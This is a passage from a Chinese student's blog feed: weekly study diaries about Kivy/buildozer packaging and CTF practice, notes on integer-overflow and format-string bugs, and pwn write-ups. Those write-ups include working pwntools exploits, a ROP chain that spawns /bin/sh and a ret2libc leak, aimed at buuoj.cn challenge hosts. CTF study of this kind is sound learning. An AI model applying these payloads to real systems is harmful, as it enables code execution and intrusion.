#p4a.branch &#x3D; master

# (str) python-for-android git clone directory (if empty, it will be automatically cloned from github)
#p4a.source_dir &#x3D;

# (str) The directory in which python-for-android should look for your own build recipes (if any)
#p4a.local_recipes &#x3D;

# (str) Filename to the hook for p4a
#p4a.hook &#x3D;

# (str) Bootstrap to use for android builds
# p4a.bootstrap &#x3D; sdl2

# (int) port number to specify an explicit --port&#x3D; p4a argument (eg for bootstrap flask)
#p4a.port &#x3D;

# Control passing the --use-setup-py vs --ignore-setup-py to p4a
# &quot;in the future&quot; --use-setup-py is going to be the default behaviour in p4a, right now it is not
# Setting this to false will pass --ignore-setup-py, true will pass --use-setup-py
# NOTE: this is general setuptools integration, having pyproject.toml is enough, no need to generate
# setup.py if you&#39;re using Poetry, but you need to add &quot;toml&quot; to source.include_exts.
#p4a.setup_py &#x3D; false


#
# iOS specific
#

# (str) Path to a custom kivy-ios folder
#ios.kivy_ios_dir &#x3D; ..&#x2F;kivy-ios
# Alternately, specify the URL and branch of a git checkout:
ios.kivy_ios_url &#x3D; https:&#x2F;&#x2F;github.com&#x2F;kivy&#x2F;kivy-ios
ios.kivy_ios_branch &#x3D; master

# Another platform dependency: ios-deploy
# Uncomment to use a custom checkout
#ios.ios_deploy_dir &#x3D; ..&#x2F;ios_deploy
# Or specify URL and branch
ios.ios_deploy_url &#x3D; https:&#x2F;&#x2F;github.com&#x2F;phonegap&#x2F;ios-deploy
ios.ios_deploy_branch &#x3D; 1.10.0

# (bool) Whether or not to sign the code
ios.codesign.allowed &#x3D; false

# (str) Name of the certificate to use for signing the debug version
# Get a list of available identities: buildozer ios list_identities
#ios.codesign.debug &#x3D; &quot;iPhone Developer: &lt;lastname&gt; &lt;firstname&gt; (&lt;hexstring&gt;)&quot;

# (str) Name of the certificate to use for signing the release version
#ios.codesign.release &#x3D; %(ios.codesign.debug)s


[buildozer]

# (int) Log level (0 &#x3D; error only, 1 &#x3D; info, 2 &#x3D; debug (with command output))
log_level &#x3D; 2

# (int) Display warning if buildozer is run as root (0 &#x3D; False, 1 &#x3D; True)
warn_on_root &#x3D; 1

# (str) Path to build artifact storage, absolute or relative to spec file
# build_dir &#x3D; .&#x2F;.buildozer

# (str) Path to build output (i.e. .apk, .ipa) storage
# bin_dir &#x3D; .&#x2F;bin

#    -----------------------------------------------------------------------------
#    List as sections
#
#    You can define all the &quot;list&quot; as [section:key].
#    Each line will be considered as a option to the list.
#    Let&#39;s take [app] &#x2F; source.exclude_patterns.
#    Instead of doing:
#
#[app]
#source.exclude_patterns &#x3D; license,data&#x2F;audio&#x2F;*.wav,data&#x2F;images&#x2F;original&#x2F;*
#
#    This can be translated into:
#
#[app:source.exclude_patterns]
#license
#data&#x2F;audio&#x2F;*.wav
#data&#x2F;images&#x2F;original&#x2F;*
#


#    -----------------------------------------------------------------------------
#    Profiles
#
#    You can extend section &#x2F; key with a profile
#    For example, you want to deploy a demo version of your application without
#    HD content. You could first change the title to add &quot;(demo)&quot; in the name
#    and extend the excluded directories to remove the HD content.
#
#[app@demo]
#title &#x3D; My Application (demo)
#
#[app:source.exclude_patterns@demo]
#images&#x2F;hd&#x2F;*
#
#    Then, invoke the command line with the &quot;demo&quot; profile:
#
#buildozer --profile demo android debug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="hgamectf2022开赛"><a href="#hgamectf2022开赛" class="headerlink" title="hgamectf2022开赛"></a>hgamectf2022开赛</h2><ul>
<li>这两天的hgamectf2022也开始了，题目很新颖，我也学到了不少，但是作为一个pwn手吧，比较丢脸的就是一个pwn题都没做出来，虽然其他方向的题目出了不少，也成功挤进前一百名，但这只是暂时的，我还需要继续努力，把自己的主方向强大起来！</li>
<li>留个图嘿嘿，最高排到39名好像</li>
</ul>
<p><img src="/img/1643119698683.png" alt="1643119698683"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>这一周收获还是挺多的，学会了buildozer打包，见识了新的ctf题型，又下了两个新软件，真的是活到老学到老，只有不断的学习，才不会落后，冲冲冲！</li>
<li>下周好像要开始大一新生的培训了，预计寒假结束还是会给他们进行一个考核赛，这就涉及到需要我们出题，到时候时间会越来越紧，不过这样也过得充实！这个寒假这样过才不算荒废！</li>
</ul>
]]></content>
      <categories>
        <category>2022</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假学习(二)</title>
    <url>/2022/01309b74.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="学习进度总结（二）（2022-1-24-2022-1-30）"><a href="#学习进度总结（二）（2022-1-24-2022-1-30）" class="headerlink" title="学习进度总结（二）（2022.1.24-2022.1.30）"></a>学习进度总结（二）（2022.1.24-2022.1.30）</h1><h2 id="作品赛ing"><a href="#作品赛ing" class="headerlink" title="作品赛ing"></a>作品赛ing</h2><p>这周的任务还是衔接上一周的内容，只不过中间出了插曲，电脑遇到不小的问题，再加上临近春节，走亲访友，时间确实抽不太出来，不过也是收获满满的一周。</p>
<h3 id="重装系统"><a href="#重装系统" class="headerlink" title="重装系统"></a>重装系统</h3><ul>
<li>只能说程序猿都是在不断debug的路上逐渐成长的。分区小白的第一次分区果然还是以失败告终，最后以重装系统结束。<del>奶奶的</del>，确实很搞心态，但是每一次的debug和试错，都会让我积累更多的经验，逐渐成为专家。</li>
<li>讲讲我的踩坑记录，也给大家提供一些有参考价值的debug方法。电脑分区失败，无法进入系统的话，最简单也是最粗暴的办法就是用系统盘直接强行进入系统，这种办法即能保全电脑里的大部分文件，还能免去很多不必要的麻烦。我最后是在网上用一个空U盘做的大白菜系统盘，然后进入系统后，拿另一个装机U盘成功拯救我的电脑。真的很有效！</li>
</ul>
<h3 id="拯救博客"><a href="#拯救博客" class="headerlink" title="拯救博客"></a>拯救博客</h3><ul>
<li>电脑是救回来了，但是D盘的东西丢了一大半，其中包括很重要的博客内容，本地保存的全都损坏找不回了。整个人傻住了，但是好在去年九月份拿U盘备份过一次，所以大部分东西还在，但我以为会很顺利就解决了，没想到U盘之前中过毒，后来好不容易恢复回来，居然在我文件里下了很多东西，加载出来很多000001这类的无关数据，删除都没法。hexo的环境也在电脑上全都丢掉了，花了两个小时把环境装上，结果还是部署不上博客，最后只有舍小保大，删掉所有主题配置，重头再来。终于经过两天一夜的抢救，整体博客算是回来了。npm指令真是个稀奇玩意儿。版本对不上hexo的版本，好多不兼容的问题就是加大了任务进展的难度，所以整整花了两天的时间才解决掉。</li>
</ul>
<h3 id="继续解决打包问题"><a href="#继续解决打包问题" class="headerlink" title="继续解决打包问题"></a>继续解决打包问题</h3><ul>
<li>打包软件的问题确实解决好了，但是队友发来的测试软件却还是出现打包后闪退的问题，不知道是不是代码的问题，总之还在调试之中……</li>
</ul>
<h2 id="过年了"><a href="#过年了" class="headerlink" title="过年了"></a>过年了</h2><p>2022年马上就到来了！新年新气象！我与旧事归于尽，来年依旧迎花开！新年快乐!!!</p>
]]></content>
      <categories>
        <category>2022</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假学习(三)</title>
    <url>/2022/0206bd6.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="学习进度总结（三）（2022-1-31-2022-2-6）"><a href="#学习进度总结（三）（2022-1-31-2022-2-6）" class="headerlink" title="学习进度总结（三）（2022.1.31-2022.2.6）"></a>学习进度总结（三）（2022.1.31-2022.2.6）</h1><h2 id="作品赛ing"><a href="#作品赛ing" class="headerlink" title="作品赛ing"></a>作品赛ing</h2><p>新年快乐！初一、初二两天有事在成都待了两天，但是没有闲着，一直也在解决打包难的问题。在网上各种找资料，发现用kivy打包apk的事都好久远了，没多少人用，更别说有报错分析的。于是只好自己一步一步摸索，还好功夫不负有心人，初三回家之后基本上算是把buildozer打包问题搞明白了，主要注意<strong>buildozer.spec</strong>文件里面的几个部分必须修改对：</p>
<ol>
<li><p>文件名称</p>
<p>很多时候打包不成功就是因为文件名称对不上main.py里面的函数名，后来每一次都改，也就没有在出过问题。</p>
</li>
<li><p>绝对路径</p>
<p>在配置文件里，main.py的路径一定要填写正确</p>
</li>
<li><p>配置要求</p>
<p>配置文件里面的<strong>requirements</strong>这一部分必须要填写完整，只要整个打包文件夹里包含到的需要使用的一些插件都需要写上，这样在打包时才会下载这些插件，最后打包出来才不会报错，也不会闪退</p>
</li>
<li><p>source.include_exts</p>
<p>这一行内容默认的一般是py,png,jpg,kv,atlas，但是很多时候自己的文件内容可能不止这些文件类型包含，这时候也需要自行添加，否则打包后就会出现闪退现象，例如有ttf格式文件，就加上ttf</p>
</li>
<li><p>网络要求</p>
<p><strong>android.permissions = INTERNET</strong>这一行也是必须打开的，默认前面有#号，是没有使用的，需要自己打开，不然打包好也是闪退</p>
</li>
</ol>
<p>反正问题很多，这也只是我暂时总结出来的一些打包经验，如果后面打包途中再遇上什么问题，我再继续补充……</p>
<p>然后打包之余也有在学习kivy的一些内容，我们现在的项目内容有一个最大的难点就是还没有关键技术，如果一直没有关键技术的话，基本上做出来也不会有多大的作用和效果，所以还得继续钻研，最晚五月份交作品，时间还是挺多的，四个人好好加油，相信一定能攻破难关！</p>
<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>寒假的时间确实大部分都在走亲访友中度过了，再加上作品赛一整，很是没有太多时间拿来学习ctf，hgame就打了第一周的，之后的每周有wp出来我也在看，还是觉得自己学的太浅了，pwn确实是任重道远，我现在的水平无法做到保证在正式比赛中有pwn方向的输出，但是我在尽力调整，争取在下学期国赛等大赛来临之前达到能保证输出的水平，为XJUSEC贡献一份力量！继续加油吧！</p>
]]></content>
      <categories>
        <category>2022</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>整数安全漏洞</title>
    <url>/2021/07231290.html</url>
    <content><![CDATA[<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出发生之后，很难立即被察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出。</p>
<p>关于整数的异常情况主要有三种：<br>(1) 溢出，只有有符号数才会发生溢出。有符号数的最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出。溢出标指OF可检测有符号数的溢出；<br>(2) 回绕，无符号数0-1时会变成最大的数，如1字节的无符号数会变成255，而255+1会变成最小数0.进位标志CF可检测无符号数的回绕；<br>(3) 截断，将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</p>
<h3 id="漏洞多发函数"><a href="#漏洞多发函数" class="headerlink" title="漏洞多发函数"></a>漏洞多发函数</h3><p>整数溢出要配合其他类型的缺陷才能有用，下面的两个函数都有一个size_t类型的参数（size_t是无符号整数类型的sizeof()的结果），常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#include&lt;string.h></span>
void <span class="token operator">*</span>memcpy<span class="token punctuation">(</span>void <span class="token operator">*</span>dest<span class="token punctuation">,</span>const void <span class="token operator">*</span>src<span class="token punctuation">,</span>size_t n<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>memcpy()函数将src所指向的字符串中以src地址开始的前n个字节复制到dest所指的数组中，并返回dest。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#include&lt;string.h></span>
char <span class="token operator">*</span>strncpy<span class="token punctuation">(</span>char <span class="token operator">*</span>dest<span class="token punctuation">,</span> const char <span class="token operator">*</span>src<span class="token punctuation">,</span>size_t n<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>strncpy()函数从源src所指的内存地址的起始位置开始复制n个字节到目标dest所指的内存地址的起始位置中。</p>
<p>两个函数中都有一个类型为size_t的参数，它是无符号整型的sizeof运算符的结果。</p>
<pre><code>typedef unsigned int size_t;    h
</code></pre>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2021/0718f08f.html</url>
    <content><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>格式化字符串漏洞是<code>PWN</code>题常见的考察点，仅次于栈溢出漏洞。漏洞原因：程序使用了格式化字符串作为参数，并且格式化字符串为用户可控。其中触发格式化字符串漏洞函数主要是<code>printf</code>、<code>sprintf</code>、<code>fprintf</code>、<code>prin</code>等C库中<code>print</code>家族的函数</p>
<h3 id="0x01-格式化字符串介绍"><a href="#0x01-格式化字符串介绍" class="headerlink" title="0x01 格式化字符串介绍"></a>0x01 格式化字符串介绍</h3><pre class="line-numbers language-none"><code class="language-none">printf（&quot;格式化字符串&quot;,参数...)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>该<code>printf</code>函数的第一个参数是由格式化说明符与字符串组成，用来规定参数用什么格式输出内容。</p>
<p>格式化说明符：</p>
<pre class="line-numbers language-none"><code class="language-none">%d - 十进制 - 输出十进制整数
%s - 字符串 - 从内存中读取字符串
%x - 十六进制 - 输出十六进制数
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 到目前为止所写的字符数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>例如：</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(void)&#123;
    printf(&quot;My name is %s&quot;,&quot;Ezreal&quot;);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用以后会显示：</p>
<pre class="line-numbers language-none"><code class="language-none">My name is Ezreal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>特别要注意的是<code>%n</code>这个格式化字符串，它的功能是将<code>%n</code>之前打印出来的字符个数，赋值给一个变量。例如：</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;

int main(void)
&#123;
    int c &#x3D; 0; 
    printf(&quot;the use of %n&quot;, &amp;c);sss
    printf(&quot;%d\n&quot;, c);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用以后会显示：</p>
<pre class="line-numbers language-none"><code class="language-none">the use of 11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="0x02-漏洞形成原因"><a href="#0x02-漏洞形成原因" class="headerlink" title="0x02 漏洞形成原因"></a>0x02 漏洞形成原因</h3><p>1、函数用法：</p>
<p>正常的<code>printf</code>用法：</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main()
&#123;
  char str[100];
  scanf(&quot;%s&quot;,str);
  printf(&quot;%s&quot;,str);
  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写程序时要规定字符串的格式化说明符，规定参数的输出类型</p>
<p>错误的<code>printf</code>写法：</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main()
&#123;
  char str[100];
  scanf(&quot;%s&quot;,str);
  printf(str);
  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>漏洞形成原因：程序将格式化字符串的输入权交给用户，printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。所以没有参数，代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。示例程序：</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;

int main(void)
&#123;
    char a[100];
    scanf(&quot;%s&quot;,a);
    printf(a);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>假设我们的输入为:</p>
<pre class="line-numbers language-none"><code class="language-none">AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>程序的输出为：</p>
<pre class="line-numbers language-none"><code class="language-none">AAAA61fe4c,61ffcc,76e4d250,70734fbf,fffffffe,76e473da,41414141,252c7825,78252c78,2c78252c,252c7825<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功打印出地址</p>
<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>对于格式化字符串漏洞的主要利用有：使程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖、任意地址内存覆盖。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>静态编译rop题目解题法</title>
    <url>/2021/1220895e.html</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="Linux系统调用-int-80h（int-0x80）"><a href="#Linux系统调用-int-80h（int-0x80）" class="headerlink" title="Linux系统调用 int 80h（int 0x80）"></a>Linux系统调用 int 80h（int 0x80）</h2><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>在计算机中，系统调用（英语：system call），又称为系统呼叫，指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。 系统调用提供了用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信。</p>
<p>Linux的系统调用通过int 80h实现，用系统调用号来区分入口函数。 操作系统实现系统调用的基本过程是：<br>      应用程序调用库函数（API）；<br>      API将系统调用号存入EAX，然后通过中断调用使系统进入内核态；<br>      内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；<br>     系统调用完成相应功能，将返回值存入EAX，返回到中断处理函数；<br>     中断处理函数返回到API中；<br>     API将EAX返回给应用程序。</p>
<h5 id="很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。"><a href="#很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。" class="headerlink" title="很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。"></a><del>很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。</del></h5><h2 id="判断静态编译"><a href="#判断静态编译" class="headerlink" title="判断静态编译"></a>判断静态编译</h2><p><strong>只要ida打开看起来很复杂的，都是静态编译的结果。这种情况下的好处就是不会调用libc中的东西，所以我们不用泄露libc版本来利用里libc函数。</strong></p>
<h2 id="解决题目"><a href="#解决题目" class="headerlink" title="解决题目"></a>解决题目</h2><p>ROPgadget有一个很强大的功能，直接利用程序中的片段拼凑rop链。</p>
<pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary rop --ropchain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="例题：inndy-rop（假的，只是为了静态编译放这儿的）"><a href="#例题：inndy-rop（假的，只是为了静态编译放这儿的）" class="headerlink" title="例题：inndy_rop（假的，只是为了静态编译放这儿的）"></a>例题：inndy_rop<del>（假的，只是为了静态编译放这儿的）</del></h3><p>32位文件，静态编译，开NX，所以直接</p>
<p><img src="/img/1643119949088.png" alt="1643119949088"></p>
<p> 最后稍作修改 </p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-none"><code class="language-none">from pwn import *
from struct import pack
 
q &#x3D; remote(&#39;node4.buuoj.cn&#39;,25783)
context.log_level &#x3D; &#39;debug&#39;
 
def payload():
    p &#x3D; &#39;a&#39;*0xc + &#39;bbbb&#39;
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret
    p +&#x3D; &#39;&#x2F;bin&#39;
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret
    p +&#x3D; &#39;&#x2F;&#x2F;sh&#39;
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080de769) # pop ecx ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806c943) # int 0x80
    return p
shell &#x3D; payload()
q.sendline(shell)
q.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/1643119981017.png" alt="1643119981017"></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>铁人三项(第五赛区)_2018_rop</title>
    <url>/2021/06256e50.html</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>查看保护机制，开了NX，32位</p>
<p><img src="/img/image-20210625101308461.png" alt="image-20210625101308461"></p>
<p>IDA打开，shift+F12查找字符串，没有发现/bin/sh</p>
<p><img src="/img/image-20210625101526643.png" alt="image-20210625101526643"></p>
<p>再查看main函数中，东西不多，挨个查看里面的函数，发现vulnerable_function();函数里面有蹊跷</p>
<p><img src="/img/image-20210625101817170.png" alt="image-20210625101817170"></p>
<p>这里发现漏洞，read的buf长度为0x100，而写入的参数大小是0x88，能溢出0x78个长度，足够构造rop攻击 </p>
<p><img src="/img/image-20210625101909489.png" alt="image-20210625101909489"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>先通过write函数地址泄露出libc版本，然后再在libc版本里算出system函数和/bin/sh的地址，最后通过栈溢出覆盖返回地址填上system(‘/bin/sh’)，夺权。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28086</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./2018_rop'</span><span class="token punctuation">)</span>

write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
main<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>

payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
write_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


